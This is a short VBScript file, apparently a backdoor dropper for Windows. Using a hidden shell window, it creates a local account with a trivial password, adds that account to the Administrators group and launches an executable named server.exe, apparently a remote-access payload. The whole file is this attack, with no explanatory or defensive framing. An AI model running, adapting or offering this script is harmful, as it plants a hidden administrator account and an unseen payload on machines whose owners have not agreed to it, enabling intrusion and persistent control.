set wshshell=createobject ("wscript.shell")   
a=wshshell.run ("cmd.exe /c net user user pass /add",0)   
b=wshshell.run ("cmd.exe /c net localgroup Administrators user /add",0)   
b=wshshell.run ("cmd.exe /c server.exe",0)   